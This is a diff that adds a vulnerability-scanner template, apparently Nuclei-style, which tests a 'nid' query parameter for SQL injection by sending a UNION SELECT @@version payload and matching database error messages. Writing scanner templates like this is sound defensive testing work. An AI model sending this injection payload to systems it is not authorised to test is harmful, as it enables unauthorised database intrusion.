@@ -1,0 +1,25 @@
+id: sqli7-212
+name: 'UNION probe in nid'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - union
+description: 'Triggers DB error via nid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      nid:
+        - ''' UNION SELECT @@version--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
